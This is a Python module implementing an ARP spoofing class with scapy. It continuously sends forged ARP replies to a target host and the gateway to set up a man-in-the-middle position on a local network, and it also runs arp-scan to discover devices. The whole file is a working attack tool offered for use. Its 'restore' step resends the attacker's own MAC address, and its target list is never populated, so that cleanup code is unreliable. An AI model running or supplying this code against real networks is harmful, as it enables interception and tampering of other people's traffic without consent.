#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ARP Spoofing Module
Man-in-the-Middle attacks and network redirection
"""

import time
import threading
from scapy.all import ARP, send, srp, get_if_hwaddr
from typing import Optional, Tuple


class ARPSpoofer:
    """Advanced ARP Spoofing Module"""

    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.packets_sent = 0
        self.targets = []
        self.gateway = None
        self.attacker_mac = get_if_hwaddr(interface)

    def discover_network(self) -> dict:
        """Discover network devices"""
        print("[+] Discovering network...")
        devices = {'gateway': None, 'targets': []}

        try:
            import subprocess
            result = subprocess.run(
                ['arp-scan', '--localnet'],
                capture_output=True, text=True
            )
            for line in result.stdout.split('\n'):
                if 'gateway' in line.lower():
                    devices['gateway'] = line.split()[0]
        except:
            pass

        return devices

    def spoof_arp(self, target_ip: str, gateway_ip: str) -> bool:
        """Perform ARP spoofing attack"""
        print(f"[+] ARP Spoofing: {target_ip} <-> {gateway_ip}")

        try:
            arp_target = ARP(
                op=2,
                pdst=target_ip,
                hwdst="ff:ff:ff:ff:ff:ff",
                psrc=gateway_ip,
                hwsrc=self.attacker_mac
            )
            send(arp_target, iface=self.interface, verbose=False)
            self.packets_sent += 1

            arp_gateway = ARP(
                op=2,
                pdst=gateway_ip,
                hwdst="ff:ff:ff:ff:ff:ff",
                psrc=target_ip,
                hwsrc=self.attacker_mac
            )
            send(arp_gateway, iface=self.interface, verbose=False)
            self.packets_sent += 1

            return True
        except Exception as e:
            print(f"[-] ARP Spoofing error: {e}")
            return False

    def start_spoofing(self, target: str, gateway: str, interval: float = 2.0):
        """Start ARP spoofing in a loop"""
        self.running = True
        self.gateway = gateway

        print(f"[+] Starting ARP spoofing every {interval}s")

        while self.running:
            try:
                self.spoof_arp(target, gateway)
                time.sleep(interval)
            except KeyboardInterrupt:
                self.stop_spoofing()
                break
            except Exception as e:
                print(f"[-] Error in spoofing loop: {e}")
                time.sleep(interval)

    def stop_spoofing(self):
        """Stop ARP spoofing and restore ARP tables"""
        self.running = False
        print("[+] Stopping ARP spoofing...")

        if self.gateway:
            for target in self.targets:
                arp_restore = ARP(
                    op=2,
                    pdst=target,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=self.gateway,
                    hwsrc=get_if_hwaddr(self.interface)
                )
                send(arp_restore, iface=self.interface, verbose=False)

        print("[+] ARP tables restored")

    def __str__(self):
        return f"ARPSpoofer(interface={self.interface}, packets={self.packets_sent})"